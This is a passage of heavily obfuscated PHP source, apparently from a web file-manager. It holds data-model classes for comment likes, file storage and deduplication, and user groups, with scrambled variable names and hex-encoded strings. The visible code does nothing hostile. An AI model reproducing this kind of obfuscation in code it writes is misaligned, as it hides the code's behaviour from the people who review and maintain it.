$Ñ¹º°áş) { $“ÙºÃÑÖ =& $_SERVER[Ö†ØøÖ±]; $«şƒåºï = array($“ÙºÃÑÖ[1927] => $íß³Â·ş); return $this->where($«şƒåºï)->save(array($“ÙºÃÑÖ[1936] => $Ñ¹º°áş)); } public function prasise($ÏÉÓŒØØ) { $Êƒ¬Õ¹ =& $_SERVER[Ö†ØøÖ±]; $í®…éëú = Model($Êƒ¬Õ¹[1937]); $¸Ü¶§ÄÁ = array($Êƒ¬Õ¹[1927] => $ÏÉÓŒØØ, $Êƒ¬Õ¹[1690] => USER_ID); $÷››ñĞŸ = $í®…éëú->where($¸Ü¶§ÄÁ)->find(); if (!$÷››ñĞŸ) { $í®…éëú->add($¸Ü¶§ÄÁ); $¤ç¡âÀš = $this->where(array($Êƒ¬Õ¹[1927] => $ÏÉÓŒØØ))->setAdd($Êƒ¬Õ¹[1929], 1); } else { $í®…éëú->where($¸Ü¶§ÄÁ)->delete(); $¤ç¡âÀš = $this->where(array($Êƒ¬Õ¹[1927] => $ÏÉÓŒØØ))->setAdd($Êƒ¬Õ¹[1929], -1); } return $¤ç¡âÀš; } public function targetInfo($ò’¶ºÀí, $Ë¡«íÅ‰) { $ñ¬Ï¤üƒ =& $_SERVER[Ö†ØøÖ±]; $¯ï²–¸– = array($ñ¬Ï¤üƒ[625] => $ò’¶ºÀí, $ñ¬Ï¤üƒ[626] => $Ë¡«íÅ‰); $öÜ¸…Ê¯ = $this->where($¯ï²–¸–)->count(); $§Œúî’² = "\122\111\x47\x48\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\143\157\155\x6d\x65\156\164\137\x70\162\141\151\163\x65\40\x73\164\x61\162\40\x6f\x6e\x20\x63\157\155\155\145\x6e\164\x2e\x63\157\155\x6d\x65\156\x74\111\x44\x20\75\x20\163\x74\x61\162\x2e\x63\x6f\155\155\x65\x6e\164\x49\x44"; $ò—©ÖŞ™ = $this->alias($ñ¬Ï¤üƒ[407])->where($¯ï²–¸–)->join($§Œúî’², $ñ¬Ï¤üƒ[1938])->count(); $ãşã„ğ = array($ñ¬Ï¤üƒ[1939] => $öÜ¸…Ê¯, $ñ¬Ï¤üƒ[1940] => $ò—©ÖŞ™); return $ãşã„ğ; } public function listData($‚“Íƒ¥³) { $¢¢öËƒù =& $_SERVER[Ö†ØøÖ±]; if (isset($‚“Íƒ¥³[$¢¢öËƒù[1941]])) { if ($‚“Íƒ¥³[$¢¢öËƒù[1941]]) { $‚“Íƒ¥³[$¢¢öËƒù[1934]] = array($¢¢öËƒù[1067], intval($‚“Íƒ¥³[$¢¢öËƒù[1941]])); } unset($‚“Íƒ¥³[$¢¢öËƒù[1941]]); } if (isset($‚“Íƒ¥³[$¢¢öËƒù[1942]])) { if ($‚“Íƒ¥³[$¢¢öËƒù[1942]]) { $‚“Íƒ¥³[$¢¢öËƒù[1934]] = array($¢¢öËƒù[1064], intval($‚“Íƒ¥³[$¢¢öËƒù[1942]])); } unset($‚“Íƒ¥³[$¢¢öËƒù[1942]]); } return $this->_listData($‚“Íƒ¥³); } private function _listData($‡Ÿ¢×ó­) { $ä–• ëÙ =& $_SERVER[Ö†ØøÖ±]; $ª–™­şó = $this->where($‡Ÿ¢×ó­)->_makeOrder()->selectPage(100); $this->_listAppendParent($ª–™­şó[$ä–• ëÙ[422]]); $this->_listAppendUser($ª–™­şó[$ä–• ëÙ[422]]); $this->_listAppendMeta($ª–™­şó[$ä–• ëÙ[422]]); return $ª–™­şó; } private function _makeOrder() { $£â•²¸® =& $_SERVER[Ö†ØøÖ±]; $‹ˆÍâ–õ = array($£â•²¸®[1929], $£â•²¸®[1928], $£â•²¸®[215]); $é…›ôë = Input::get($£â•²¸®[507], $£â•²¸®[7], $£â•²¸®[474], $‹ˆÍâ–õ); $ø‰Í˜‹È = Input::get($£â•²¸®[508], $£â•²¸®[7], $£â•²¸®[1692], array($£â•²¸®[1943], $£â•²¸®[503])); $é‚£ü±é = $é…›ôë . $£â•²¸®[53] . $ø‰Í˜‹È; return $this->order($é‚£ü±é); } private function _listAppendParent(&$›«Õ¶´€) { $ó•»Äâš =& $_SERVER[Ö†ØøÖ±]; $ÙñÎÍ± = array_unique(array_to_keyvalue($›«Õ¶´€, $ó•»Äâš[12], $ó•»Äâš[1926])); $ÙñÎÍ± = array_remove_value($ÙñÎÍ±, $ó•»Äâš[212]); if (!$ÙñÎÍ±) { return; } $Ò²³áêÄ = $this->where(array($ó•»Äâš[1927] => array($ó•»Äâš[7], $ÙñÎÍ±)))->select(); $Ò²³áêÄ = array_to_keyvalue($Ò²³áêÄ, $ó•»Äâš[1934]); foreach ($›«Õ¶´€ as &$ıß“üù“) { if (isset($Ò²³áêÄ[$ıß“üù“[$ó•»Äâš[1926]]])) { $ıß“üù“[$ó•»Äâš[1944]] = $Ò²³áêÄ[$ıß“üù“[$ó•»Äâš[1926]]]; } } unset($ıß“üù“); } private function _listAppendUser(&$Î© ¬Úè) { $ï”™­óè =& $_SERVER[Ö†ØøÖ±]; $Ÿ‰¹ÎÃ = array_unique(array_to_keyvalue($Î© ¬Úè, $ï”™­óè[12], $ï”™­óè[1699])); $Ÿ‰¹ÎÃ = array_remove_value($Ÿ‰¹ÎÃ, $ï”™­óè[212]); if (count($Ÿ‰¹ÎÃ) == 0) { return; } foreach ($Î© ¬Úè as $Ş°å¶°) { if (isset($Ş°å¶°[$ï”™­óè[1944]])) { $Ÿ‰¹ÎÃ[] = $Ş°å¶°[$ï”™­óè[1944]][$ï”™­óè[1699]]; } } $ŒäŸÚâ = Model($ï”™­óè[576])->userListInfo($Ÿ‰¹ÎÃ); foreach ($Î© ¬Úè as &$Ş°å¶°) { $Ş°å¶°[$ï”™­óè[639]] = $ŒäŸÚâ[$Ş°å¶°[$ï”™­óè[1699]]]; if (isset($Ş°å¶°[$ï”™­óè[1944]])) { $Ş°å¶°[$ï”™­óè[1944]][$ï”™­óè[639]] = $ŒäŸÚâ[$Ş°å¶°[$ï”™­óè[1944]][$ï”™­óè[1699]]]; } } unset($Ş°å¶°); } private function _listAppendMeta(&$•½îÄê­) { $ş½‹³ÁŸ =& $_SERVER[Ö†ØøÖ±]; $òÙ™†³İ = array_unique(array_to_keyvalue($•½îÄê­, $ş½‹³ÁŸ[12], $ş½‹³ÁŸ[1934])); $òÙ™†³İ = array_remove_value($òÙ™†³İ, $ş½‹³ÁŸ[212]); if (!$òÙ™†³İ) { return; } foreach ($•½îÄê­ as $éê½”™ï) { if (isset($éê½”™ï[$ş½‹³ÁŸ[1944]])) { $òÙ™†³İ[] = $éê½”™ï[$ş½‹³ÁŸ[1944]][$ş½‹³ÁŸ[1934]]; } } $¨¦òã¹ë = $this->metaList($òÙ™†³İ); if (!$¨¦òã¹ë) { return !1; } foreach ($•½îÄê­ as &$éê½”™ï) { $éê½”™ï[$ş½‹³ÁŸ[516]] = $¨¦òã¹ë[$éê½”™ï[$ş½‹³ÁŸ[1934]]]; if (isset($éê½”™ï[$ş½‹³ÁŸ[1944]])) { $éê½”™ï[$ş½‹³ÁŸ[1944]][$ş½‹³ÁŸ[516]] = $¨¦òã¹ë[$éê½”™ï[$ş½‹³ÁŸ[1944]][$ş½‹³ÁŸ[1934]]]; } } unset($éê½”™ï); } private function metaList($Ëäü¯) { $ Š—ƒ½ =& $_SERVER[Ö†ØøÖ±]; if (!$Ëäü¯) { return array(); } $Œú¤¾×Š = array($ Š—ƒ½[1934] => array($ Š—ƒ½[7], $Ëäü¯)); $ú¢Ç = Model($ Š—ƒ½[1945])->where($Œú¤¾×Š)->select(); $ú¢Ç = array_to_keyvalue_group($ú¢Ç, $ Š—ƒ½[1934]); foreach ($ú¢Ç as $”íÛï ° => $Áèì–ğÁ) { $¢ïÉ˜ûÒ = array(); foreach ($Áèì–ğÁ as $·Ü«ªµÅ) { $¢ïÉ˜ûÒ[$·Ü«ªµÅ[$ Š—ƒ½[94]]] = $·Ü«ªµÅ[$ Š—ƒ½[427]]; } $ú¢Ç[$”íÛï °] = $¢ïÉ˜ûÒ; } return $ú¢Ç ? $ú¢Ç : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\154\145\137\x63\x6f\x6e\164\x65\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\151\155\x65", "\164\x69\155\145", "\151\156\x73\145\x72\164", "\x66\x75\156\143\x74\x69\157\x6e")); } goto D´ºö‘öâ¼; D´ºö‘öâ¼: class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\154\145"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\155\x65" => "\x69\157\x5f\146\151\154\145\x5f\155\145\164\141", "\x6d\145\x74\141\x46\151\145\154\144" => "\146\x69\154\x65\111\104"); public function fileInfo($¢ë• –…) { $ÚËÈî =& $_SERVER[Ö†ØøÖ±]; static $—êÜ§Ü° = array(); if (!isset($—êÜ§Ü°[$¢ë• –…])) { $´›ª«´Ë = $ÚËÈî[1946]; $™ò‘”ù¬ = Model($ÚËÈî[521])->field($´›ª«´Ë)->where(array($ÚËÈî[519] => $¢ë• –…))->find(); $—êÜ§Ü°[$¢ë• –…] = $™ò‘”ù¬; } return $—êÜ§Ü°[$¢ë• –…]; } public function addFileByContent($Á‹€ É = '', $ƒş‡€²ï = '') { $“ØÖÄ¨Õ =& $_SERVER[Ö†ØøÖ±]; $Õ‚£›„° = TEMP_PATH . $“ØÖÄ¨Õ[1947]; if (!is_dir($Õ‚£›„°)) { mk_dir($Õ‚£›„°); } $ËÓÛ¿¬ = $Õ‚£›„° . $“ØÖÄ¨Õ[1948] . rand_string(16); file_put_contents($ËÓÛ¿¬, $Á‹€ É); $ı‘õÑ­à = $this->addFile($ËÓÛ¿¬, $ƒş‡€²ï, !0); if (file_exists($ËÓÛ¿¬)) { @unlink($ËÓÛ¿¬); } return $ı‘õÑ­à; } public function createFileName($šã±İ, $¸Ó’®œ = false, $†¬¹¨±£ = false) { $ãó¬¯°† =& $_SERVER[Ö†ØøÖ±]; $²ÅºÑÀ­ = IO::init($ãó¬¯°†[8]); $ñ ì¸¯÷ = $this->makeFilePath($šã±İ, $²ÅºÑÀ­, $¸Ó’®œ, $†¬¹¨±£); $‰Ó€›Å = $²ÅºÑÀ­->pathFather($ñ ì¸¯÷); static $¹Ã–î»µ = false; $şÔÒ÷£— = $ãó¬¯°†[1949] . md5($‰Ó€›Å); if (!$¹Ã–î»µ && !Cache::get($şÔÒ÷£—)) { $¹Ã–î»µ = !0; $¹İ¨ûıØ = IO::mkdir($‰Ó€›Å); if (!IO::exist($¹İ¨ûıØ . $ãó¬¯°†[850])) { IO::mkfile($¹İ¨ûıØ . $ãó¬¯°†[850]); } Cache::set($şÔÒ÷£—, 1, 3600 * 2); } return $ñ ì¸¯÷; } public function makeFilePath($²¥±õì÷, $¢ûˆÎ•Ö, $ûäğèªï = false, $š¼Ö¡ÙÊ = false) { $Ò˜ä«¬ö =& $_SERVER[Ö†ØøÖ±]; $–ğÀÁÙ = Model($Ò˜ä«¬ö[823])->get($Ò˜ä«¬ö[1950]); $ı€€òšê = KodIO::defaultIO() . date($Ò˜ä«¬ö[1951]); $Ë±Œ®áÅ = $ı€€òšê . rand_string(5) . short_id(100); $²¥±õì÷ = str_replace($Ò˜ä«¬ö[8], $Ò˜ä«¬ö[11], KodIO::clear($²¥±õì÷)); $¿ïŞ£à« = $¢ûˆÎ•Ö->ext($²¥±õì÷); if (!$²¥±õì÷) { $–ğÀÁÙ = $Ò˜ä«¬ö[1952]; } switch ($–ğÀÁÙ) { case $Ò˜ä«¬ö[1953]: $Ë±Œ®áÅ = $Ë±Œ®áÅ . $Ò˜ä«¬ö[10] . $¢ûˆÎ•Ö->ext($²¥±õì÷); if ($¿ïŞ£à« == $Ò˜ä«¬ö[1890]) { $Ë±Œ®áÅ .= $Ò˜ä«¬ö[1259]; } break; case $Ò˜ä«¬ö[1954]: $¹¼›Ô™Æ = Model($Ò˜ä«¬ö[823])->get($Ò˜ä«¬ö[824]); $€Ü‘á¼× = substr(md5($Ò˜ä«¬ö[825] . $¹¼›Ô™Æ . date($Ò˜ä«¬ö[801])), 0, 8); $µ‰¡ÁŒê = KodIO::defaultDriver(); $ı€€òšê = $Ò˜ä«¬ö[1290] . $µ‰¡ÁŒê[$Ò˜ä«¬ö[451]] . $Ò˜ä«¬ö[461] . date($Ò˜ä«¬ö[1955]) . $€Ü‘á¼× . $Ò˜ä«¬ö[8]; if ($¿ïŞ£à« == $Ò˜ä«¬ö[1890]) { $²¥±õì÷ .= $Ò˜ä«¬ö[1259]; } $ ·Ü©ó× = $Ò˜ä«¬ö[1956] . $ı€€òšê . $²¥±õì÷; CacheLock::lock($ ·Ü©ó×); $Ë±Œ®áÅ = $ı€€òšê . $²¥±õì÷; if (IO::exist($ı€€òšê . $²¥±õì÷)) { $¸Ôİëøû = substr($²¥±õì÷, 0, strlen($²¥±õì÷) - strlen($¿ïŞ£à«)); $Ÿ´¡§ºİ = $š¼Ö¡ÙÊ ? substr($š¼Ö¡ÙÊ, 0, 5) : ($ûäğèªï ? substr($ûäğèªï, 0, 5) : rand_string(5)); $Ë±Œ®áÅ = $ı€€òšê . $¸Ôİëøû . $Ÿ´¡§ºİ . $Ò˜ä«¬ö[10] . $¿ïŞ£à«; } if (IO::isTypeObject($Ë±Œ®áÅ) && !IO::isUploadServer($Ë±Œ®áÅ)) { if (IO::exist($Ë±Œ®áÅ)) { return $Ë±Œ®áÅ; } $È›êú£– = IO::setContent($Ë±Œ®áÅ, $Ò˜ä«¬ö[12]); if (!$È›êú£–) { show_json($Ò˜ä«¬ö[1957], !1); } } CacheLock::unlock($ ·Ü©ó×); break; case $Ò˜ä«¬ö[1952]: break; default: break; } return $Ë±Œ®áÅ; } public function addFileByRemote($óÃŠÅˆİ, $şşß´”‘, $±Ñ÷Ë = array()) { $ŠÉ§ĞŸ =& $_SERVER[Ö†ØøÖ±]; if (!IO::exist($óÃŠÅˆİ)) { return !1; } $Ê™˜…ÆÕ = $±Ñ÷Ë[$ŠÉ§ĞŸ[650]] ? $±Ñ÷Ë[$ŠÉ§ĞŸ[650]] : $ŠÉ§ĞŸ[12]; $â·èÓ½™ = IO::hashMd5($óÃŠÅˆİ, $Ê™˜…ÆÕ); $ÅúÓ„Œ = KodIO::defaultDriver(); $ò‹É€ã© = array($ŠÉ§ĞŸ[594] => IO::size($óÃŠÅˆİ), $ŠÉ§ĞŸ[1958] => 1, $ŠÉ§ĞŸ[471] => $şşß´”‘, $ŠÉ§ĞŸ[861] => $ÅúÓ„Œ[$ŠÉ§ĞŸ[451]], $ŠÉ§ĞŸ[472] => $óÃŠÅˆİ, $ŠÉ§ĞŸ[1959] => $±Ñ÷Ë[$ŠÉ§ĞŸ[649]] ? $±Ñ÷Ë[$ŠÉ§ĞŸ[649]] : IO::hashSimple($óÃŠÅˆİ), $ŠÉ§ĞŸ[1960] => $â·èÓ½™ ? $â·èÓ½™ : $Ê™˜…ÆÕ); if ($¾ÁÊ¥Í² = $this->addFileCheckExist($ò‹É€ã©[$ŠÉ§ĞŸ[649]], $ò‹É€ã©[$ŠÉ§ĞŸ[650]], $ò‹É€ã©[$ŠÉ§ĞŸ[76]])) { return $¾ÁÊ¥Í²; } return $this->addFileData($ò‹É€ã©); } private function addFileData($ÂÚ‚„Ì£) { $ñµ¦Üú› =& $_SERVER[Ö†ØøÖ±]; if (!$ÂÚ‚„Ì£) { return !1; } $ÂÚ‚„Ì£[$ñµ¦Üú›[76]] = intval($ÂÚ‚„Ì£[$ñµ¦Üú›[76]]); if (!$ÂÚ‚„Ì£[$ñµ¦Üú›[76]] && strlen($ÂÚ‚„Ì£[$ñµ¦Üú›[649]]) > 32) { $ÂÚ‚„Ì£[$ñµ¦Üú›[76]] = intval(substr($ÂÚ‚„Ì£[$ñµ¦Üú›[649]], 32)); } $½¤£Ííˆ = $this->add($ÂÚ‚„Ì£); return $this->find($½¤£Ííˆ); } public function addFile($Ã«Õ¶Ö¡, $˜¿Ù Ã, $âÔ´„– = false) { $¤ÓÊôóÑ =& $_SERVER[Ö†ØøÖ±]; $¬å¤ğëœ = IO::hashSimple($Ã«Õ¶Ö¡); $†¿  ¼ = IO::size($Ã«Õ¶Ö¡); $ğíæ‡Õ­ = $†¿  ¼ <= 1024 * 1024 * 10 ? IO::hashMd5($Ã«Õ¶Ö¡) : $¤ÓÊôóÑ[12]; $“ä‡¦‹ = $¤ÓÊôóÑ[1961] . $¬å¤ğëœ; CacheLock::lock($“ä‡¦‹); if ($ğíæ‡Õ­ && $¬å¤ğëœ) { $Óê¸Â´² = $this->addFileCheckExist($¬å¤ğëœ, $ğíæ‡Õ­, $†¿  ¼); if ($Óê¸Â´²) { CacheLock::unlock($“ä‡¦‹); return $Óê¸Â´²; } } $ĞàåÅÅ = $this->addFileMake($Ã«Õ¶Ö¡, $†¿  ¼, $¬å¤ğëœ, $ğíæ‡Õ­, $˜¿Ù Ã, $âÔ´„–); $©Ğ‹ğÛã = $this->addFileData($ĞàåÅÅ); CacheLock::unlock($“ä‡¦‹); if (!$ğíæ‡Õ­ && $©Ğ‹ğÛã) { $this->fileMd5Check($©Ğ‹ğÛã); } return $©Ğ‹ğÛã; } private function fileMd5Check($Ô°ÚĞÕ) { $äÚ‹ì®ö =& $_SERVER[Ö†ØøÖ±]; $Ù€Î÷— = array($Ô°ÚĞÕ[$äÚ‹ì®ö[518]], $Ô°ÚĞÕ[$äÚ‹ì®ö[84]]); $ÊÉ‚ãú¯ = $äÚ‹ì®ö[1962] . $Ô°ÚĞÕ[$äÚ‹ì®ö[84]]; $Šï³ÃÍ = $äÚ‹ì®ö[1963] . $Ô°ÚĞÕ[$äÚ‹ì®ö[518]]; $åÁÎÌ²€ = TaskQueue::add($äÚ‹ì®ö[1964], $Ù€Î÷—, $ÊÉ‚ãú¯, $Šï³ÃÍ); if (!$åÁÎÌ²€) { $this->fileMd5Set($Ô°ÚĞÕ[$äÚ‹ì®ö[518]], $Ô°ÚĞÕ[$äÚ‹ì®ö[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($÷™ÔåÑ‰, $ë‘è„şÅ) { $Ç˜Å‚¸Õ =& $_SERVER[Ö†ØøÖ±]; $“à©Ì®Œ = $this->find($÷™ÔåÑ‰); if (!$“à©Ì®Œ || $“à©Ì®Œ[$Ç˜Å‚¸Õ[650]]) { return; } $³Åœ¡ù’ = IO::hashMd5($ë‘è„şÅ); if (!$³Åœ¡ù’) { return $Ç˜Å‚¸Õ[12]; } $this->where(array($Ç˜Å‚¸Õ[518] => $÷™ÔåÑ‰))->save(array($Ç˜Å‚¸Õ[650] => $³Åœ¡ù’)); } public function addFileMake($‚¸†Û, $£«±Ö‰İ, $ÄÑ³ÖË×, $“Ûä˜Ì×, $œÊäÄ€¥, $—æ¿¡ü) { $Ö‚Ë¦Ì¥ =& $_SERVER[Ö†ØøÖ±]; $ØŒ’ä×™ = $this->createFileName($œÊäÄ€¥, $ÄÑ³ÖË×, $“Ûä˜Ì×); $àÌÎåÅà = get_path_father($ØŒ’ä×™); $•µ«’ÈÔ = get_path_this($ØŒ’ä×™); if ($—æ¿¡ü) { $±÷üÇÆú = IO::move($‚¸†Û, $àÌÎåÅà, !1, $•µ«’ÈÔ); } else { $±÷üÇÆú = IO::copy($‚¸†Û, $àÌÎåÅà, !1, $•µ«’ÈÔ); } if (!$±÷üÇÆú) { return !1; } $ÅÏ€³…ô = KodIO::defaultDriver(); $³çáÏ³Ó = array($Ö‚Ë¦Ì¥[594] => $£«±Ö‰İ, $Ö‚Ë¦Ì¥[1958] => 1, $Ö‚Ë¦Ì¥[471] => $œÊäÄ€¥, $Ö‚Ë¦Ì¥[861] => $ÅÏ€³…ô[$Ö‚Ë¦Ì¥[451]], $Ö‚Ë¦Ì¥[472] => $ØŒ’ä×™, $Ö‚Ë¦Ì¥[1959] => $ÄÑ³ÖË×, $Ö‚Ë¦Ì¥[1960] => $“Ûä˜Ì×); return $³çáÏ³Ó; } public function addFileCheckExist($ì»“®‡ñ, $áçî°û, $´³–ù–ü) { $ØÖñèÌò =& $_SERVER[Ö†ØøÖ±]; $ç’Š¡Öô = $this->findByHash($ì»“®‡ñ, $áçî°û); if (!$ç’Š¡Öô) { return !1; } $æŠïá = array($ØÖñèÌò[1958] => intval($ç’Š¡Öô[$ØÖñèÌò[1965]]) + 1, $ØÖñèÌò[594] => $´³–ù–ü); $this->where(array($ØÖñèÌò[519] => $ç’Š¡Öô[$ØÖñèÌò[518]]))->save($æŠïá); return $ç’Š¡Öô; } public function remove($ÆİŠÌ­) { $this->linkCountChange($ÆİŠÌ­, !1); $this->clearEmpty(); return !0; } public function linkAdd($°ãä¡à½) { $this->linkCountChange($°ãä¡à½, !0); } public function linkCountChange($•›ÆµÀ‚, $şïğ¾™ì) { $É§İ†ı‰ =& $_SERVER[Ö†ØøÖ±]; if (!$•›ÆµÀ‚) { return; } if (!is_array($•›ÆµÀ‚)) { $•›ÆµÀ‚ = array($•›ÆµÀ‚); } $íÉğ¾¦ = array(); foreach ($•›ÆµÀ‚ as $õé”ˆ½) { $ı·†·Ş = $õé”ˆ½ . $É§İ†ı‰[12]; if (!$íÉğ¾¦[$ı·†·Ş]) { $íÉğ¾¦[$ı·†·Ş] = 0; } $íÉğ¾¦[$ı·†·Ş]++; } $İ¤ãöÉ½ = array(); foreach ($íÉğ¾¦ as $õé”ˆ½ => $£õÓóı°) { $ı·†·Ş = $£õÓóı° . $É§İ†ı‰[12]; if (!$İ¤ãöÉ½[$ı·†·Ş]) { $İ¤ãöÉ½[$ı·†·Ş] = array(); } $İ¤ãöÉ½[$ı·†·Ş][] = $õé”ˆ½; } foreach ($İ¤ãöÉ½ as $£õÓóı° => $Ä…‚“¹ ) { if (!$Ä…‚“¹ ) { continue; } $£õÓóı° = $şïğ¾™ì ? $£õÓóı° : -intval($£õÓóı°); $Ğ¢îı®Ó = array($É§İ†ı‰[518] => array($É§İ†ı‰[7], $Ä…‚“¹ )); if ($£õÓóı° < 0) { $Ğ¢îı®Ó[$É§İ†ı‰[1965]] = array($É§İ†ı‰[1068], abs($£õÓóı°)); } $this->where($Ğ¢îı®Ó)->setAdd($É§İ†ı‰[1965], $£õÓóı°); } } public function findByHash($‚àŞãƒ, $…à’æ˜ = false) { $ûËÍ¡ÂĞ =& $_SERVER[Ö†ØøÖ±]; if (!$‚àŞãƒ && !$…à’æ˜) { return !1; } $õÅ»ı¤ = array($ûËÍ¡ÂĞ[1959] => $‚àŞãƒ); if ($…à’æ˜) { $õÅ»ı¤ = array($ûËÍ¡ÂĞ[1960] => $…à’æ˜); } return $this->order($ûËÍ¡ÂĞ[1966])->where($õÅ»ı¤)->find(); } public function clearEmpty($¯õÀ¿¸Ë = 0) { $¶Ë‘°æç =& $_SERVER[Ö†ØøÖ±]; $Ã‚Ê€Ğ† = time() - 3600 * 24 * $¯õÀ¿¸Ë; $í·¾öÅë = $¶Ë‘°æç[1967] . $Ã‚Ê€Ğ†; $„ü«ê…€ = $this->where($í·¾öÅë)->select(); if (!$„ü«ê…€) { return; } $Ç¦³ïì = new Task($¶Ë‘°æç[1968], $¶Ë‘°æç[12], count($„ü«ê…€)); foreach ($„ü«ê…€ as $üµê‰Å¿) { $Ç¦³ïì->update(1); $this->resetFile($üµê‰Å¿); } $Ç¦³ïì->end(); } public function resetFile($õ†áÉÂï) { $Ìİ‘Ë‚¼ =& $_SERVER[Ö†ØøÖ±]; $ĞàéÀ½ = array($Ìİ‘Ë‚¼[519] => $õ†áÉÂï[$Ìİ‘Ë‚¼[518]]); $ìşäà»ß = Model($Ìİ‘Ë‚¼[1385])->where($ĞàéÀ½)->count(); $ûÉúé°¸ = Model($Ìİ‘Ë‚¼[1969])->where($ĞàéÀ½)->count(); $Ä„¢öÏ = intval($ìşäà»ß) + intval($ûÉúé°¸); if ($Ä„¢öÏ == 0) { IO::remove($õ†áÉÂï[$Ìİ‘Ë‚¼[84]]); Model($Ìİ‘Ë‚¼[1970])->delete($õ†áÉÂï[$Ìİ‘Ë‚¼[518]]); $this->where($ĞàéÀ½)->delete(); $this->metaSet($õ†áÉÂï[$Ìİ‘Ë‚¼[518]], null, null); return; } if ($õ†áÉÂï[$Ìİ‘Ë‚¼[1965]] != $Ä„¢öÏ) { $this->where($ĞàéÀ½)->save(array($Ìİ‘Ë‚¼[1958] => $Ä„¢öÏ)); } } public function storageInfo($À‰¸Üóº = false) { $ß§Êáï  =& $_SERVER[Ö†ØøÖ±]; $ôº¸ÄíŸ = $this->count() + 0.0; $Ñ­Å¨¨Œ = 0; $¥¹²üòÜ = 1; $İ”é¼ï¸ = 0; $¡ù´¶Ü = 5000; for ($Îß³Ïòİ = 0; $Îß³Ïòİ < $ôº¸ÄíŸ; $Îß³Ïòİ = $Îß³Ïòİ + $¡ù´¶Ü) { $õíË«ºå = $this->limit($Îß³Ïòİ, $Îß³Ïòİ + $¡ù´¶Ü)->select(); foreach ($õíË«ºå as $˜ü…‘ÓÏ) { $¥¹²üòÜ += $˜ü…‘ÓÏ[$ß§Êáï [76]] * $˜ü…‘ÓÏ[$ß§Êáï [1965]]; $Ñ­Å¨¨Œ += $˜ü…‘ÓÏ[$ß§Êáï [76]] * ($˜ü…‘ÓÏ[$ß§Êáï [1965]] - 1); $İ”é¼ï¸ += $˜ü…‘ÓÏ[$ß§Êáï [1965]]; } } $Ä…ŒŒ• = array($ß§Êáï [1971] => $¥¹²üòÜ, $ß§Êáï [1972] => $Ñ­Å¨¨Œ, $ß§Êáï [1973] => $Ñ­Å¨¨Œ / $¥¹²üòÜ, $ß§Êáï [80] => $ôº¸ÄíŸ, $ß§Êáï [1974] => $İ”é¼ï¸); return $Ä…ŒŒ•; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\x70"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\x65" => "\x67\x72\x6f\x75\x70\x5f\155\x65\164\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\144" => "\x67\162\157\x75\160\x49\104"); protected function cacheFunctionAlias($Ïæ‰âÛ÷) { $ªùÓ¸Éí =& $_SERVER[Ö†ØøÖ±]; return array($ªùÓ¸Éí[1975] => array($Ïæ‰âÛ÷[0], $ªùÓ¸Éí[1976]), $ªùÓ¸Éí[1977] => array($Ïæ‰âÛ÷[0], $ªùÓ¸Éí[1978])); } protected function getInfo($Ø·—Ó, $¨•ŞªØ† = false) { $×õ¾›ë´ = $this->getInfoSimple($Ø·—Ó); if (!$×õ¾›ë´) { return !1; } if ($¨•ŞªØ†) { return $this->_listDataApplyItem($×õ¾›ë´); } return $this->cacheFunctionGet($_SERVER[Ö†ØøÖ±][1979], $Ø·—Ó); } protected function getInfoSimple($££äÏÌ¿, $õêÉ­²÷ = false) { $ÃšÚËÆ£ =& $_SERVER[Ö†ØøÖ±]; if ($õêÉ­²÷) { $”Ëİì¶æ = array($ÃšÚËÆ£[1897] => intval($££äÏÌ¿)); $é½ü»Ë = $this->where($”Ëİì¶æ)->find(); return is_array($é½ü»Ë) ? $é½ü»Ë : array(); } return $this->cacheFunctionGet($ÃšÚËÆ£[1980], $££äÏÌ¿); } protected function groupAdd($Ëº³³Äë) { $·„é×í =& $_SERVER[Ö†ØøÖ±]; if (!$Ëº³³Äë[$·„é×í[180]] && isset($Ëº³³Äë[$·„é×í[1897]]) && $Ëº³³Äë[$·„é×í[1897]] == 1) { if ($ÇÅˆ†İó = $this->getInfoSimple($Ëº³³Äë[$·„é×í[1897]], !0)) { return $Ëº³³Äë[$·„é×í[1897]]; } } else { $ÇÅˆ†İó = $this->getInfoSimple($Ëº³³Äë[$·„é×í[180]]); if (!$ÇÅˆ†İó) { return !1; } } $İëè¡‚Ş = $·„é×í[572]; if ($ÇÅˆ†İó[$·„é×í[562]]) { $İëè¡‚Ş = $ÇÅˆ†İó[$·„é×í[562]] . $ÇÅˆ†İó[$·„é×í[1897]] . $·„é×í[50]; } $šÂœè» = array($·„é×í[471] => $this->groupNameAuto($Ëº³³Äë[$·„é×í[180]], $Ëº³³Äë[$·„é×í[32]]), $·„é×í[454] => $Ëº³³Äë[$·„é×í[180]], $·„é×í[629] => $İëè¡‚Ş, $·„é×í[1981] => $Ëº³³Äë[$·„é×í[1884]], $·„é×í[1982] => 0, $·„é×í[1901] => 0); if (isset($Ëº³³Äë[$·„é×í[1921]])) { $šÂœè»[$·„é×í[1921]] = $Ëº³³Äë[$·„é×í[1921]]; } else { $¯´±øŸ¹ = $this->max($·„é×í[1921]); if (!$¯´±øŸ¹) { $¯´±øŸ¹ = 0; } $šÂœè»[$·„é×í[1921]] = $¯´±øŸ¹ + 1; } if (!empty($Ëº³³Äë[$·„é×í[1897]])) { $šÂœè»[$·„é×í[1897]] = $Ëº³³Äë[$·„é×í[1897]]; } $“‡Ÿíõñ = $this->add($šÂœè»); $this->setNamePinyin($“‡Ÿíõñ, $šÂœè»[$·„é×í[32]]); if (isset($Ëº³³Äë[$·„é×í[1983]])) { $this->metaSet($“‡Ÿíõñ, array($·„é×í[1983] => $Ëº³³Äë[$·„é×í[1983]], $·„é×í[1984] => $Ëº³³Äë[$·„é×í[1984]])); unset($Ëº³³Äë[$·„é×í[1983]]); unset($Ëº³³Äë[$·„é×í[1984]]); } Model($·„é×í[1385])->groupRootAdd($“‡Ÿíõñ); $this->_clearCache($Ëº³³Äë[$·„é×í[180]]); return $“‡Ÿíõñ; } protected function groupEdit($ì¢°›ò©, $Í¥ô×) { $ÁÃÖãÔø =& $_SERVER[Ö†ØøÖ±]; $·†¡ú»ü = $this->getInfoSimple($ì¢°›ò©); if (!$·†¡ú»ü) { return !1; } if 